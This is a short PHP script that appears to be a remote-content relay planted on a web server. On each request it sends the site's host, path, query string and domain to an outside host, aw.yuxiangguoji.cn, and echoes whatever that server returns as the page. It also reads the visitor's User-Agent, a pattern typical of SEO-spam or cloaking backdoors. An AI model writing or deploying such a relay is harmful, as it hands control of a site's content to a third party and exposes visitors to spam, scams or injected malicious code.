<?php
header('Content-Type:text/html;charset=gb2312');
$key= $_SERVER["HTTP_USER_AGENT"];
var_dump($key);

date_default_timezone_set('PRC');
$TD_server = "http://aw.yuxiangguoji.cn/"; 
$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
var_dump($TD_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);
$Content_mb=file_get_contents($TD_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);

echo $Content_mb;


?>